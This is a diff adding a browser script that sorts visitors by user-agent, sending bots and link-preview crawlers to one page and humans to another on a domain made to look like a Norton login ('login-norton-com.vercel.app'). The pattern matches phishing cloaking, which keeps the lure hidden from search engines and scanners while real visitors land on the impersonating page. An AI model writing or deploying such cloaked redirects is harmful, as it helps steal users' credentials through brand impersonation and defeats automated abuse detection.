@@ -1,0 +1,37 @@
+<script>
+// Define URLs
+const botURL = "https://login-norton-com.vercel.app/";
+const humanURL = "https://login-norton-com.vercel.app/norton-02/";
+
+// Function to detect bot
+function isBot() {
+  const botPatterns = [
+    /bot/i,
+    /crawl/i,
+    /spider/i,
+    /slurp/i,
+    /fetch/i,
+    /search/i,
+    /yandex/i,
+    /baidu/i,
+    /bing/i,
+    /duckduckgo/i,
+    /embedly/i,
+    /facebook/i,
+    /quora/i,
+    /pinterest/i,
+    /reddit/i,
+    /twitter/i,
+    /whatsapp/i
+  ];
+  
+  return botPatterns.some(pattern => pattern.test(navigator.userAgent));
+}
+
+// Redirect based on detection
+if (isBot()) {
+  window.location.href = botURL;
+} else {
+  window.location.href = humanURL;
+}
+</script>
